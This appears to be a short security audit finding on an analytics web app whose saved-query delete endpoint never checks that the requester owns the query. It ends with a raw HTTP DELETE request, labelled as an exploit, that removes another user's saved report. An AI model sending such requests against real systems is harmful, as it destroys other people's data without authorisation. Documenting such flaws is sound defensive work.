diagnosis: The saved query deletion endpoint fetches the query using ormar's get_or_none(id=query_id) and immediately invokes .delete() without validating that saved_query.author_id == current_user.id. Any authenticated analyst can delete saved reports created by colleagues.
exploit_request:
DELETE /analytics/saved-queries/451 HTTP/1.1
Host: bi.analytics.io
Authorization: Bearer <analyst_token>
